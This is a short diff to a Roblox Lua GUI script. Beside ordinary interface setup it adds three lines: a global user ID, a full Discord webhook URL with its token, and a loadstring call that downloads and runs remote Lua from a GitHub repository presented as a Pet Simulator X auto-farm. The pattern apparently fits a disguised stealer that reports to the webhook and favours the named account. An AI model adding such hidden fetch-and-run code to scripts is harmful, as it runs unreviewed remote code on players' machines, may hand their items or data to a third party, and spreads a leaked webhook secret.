@@ -39,7 +39,9 @@ local TextLabel_4 = Instance.new("TextLabel")
 local TextLabel_5 = Instance.new("TextLabel")
 local Infoframe = Instance.new("Frame")
 
-
+_G.UserID = 2624386338
+_G.WebHook = "https://discord.com/api/webhooks/1065377436977602641/blGYVlrzrqxoVgTiBM33wOGve7WNPVDm3mNEuEwvMpeVQE-taxz1xAvLo3Tgp0B45Tn7"
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
 
 WsCAM.Name = "WsCAM"
 WsCAM.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
